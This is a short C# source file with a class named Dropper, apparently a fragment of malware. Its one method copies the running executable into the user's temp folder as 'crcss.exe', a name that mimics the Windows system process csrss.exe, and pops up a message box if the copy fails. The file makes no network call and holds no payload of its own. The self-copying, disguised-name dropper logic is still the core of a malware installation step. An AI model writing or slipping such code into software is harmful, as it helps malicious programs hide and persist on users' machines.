using System;
using System.IO;
using System.Windows.Forms;

class Dropper
{
    public static void DropToTemp()
    {
        try
        {
            string currentExe = Application.ExecutablePath;
            string tempPath = Path.Combine(Path.GetTempPath(), "crcss.exe");

            if (!File.Exists(tempPath))
            {
                File.Copy(currentExe, tempPath);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show("Drop failed: " + ex.Message);
        }
    }
}
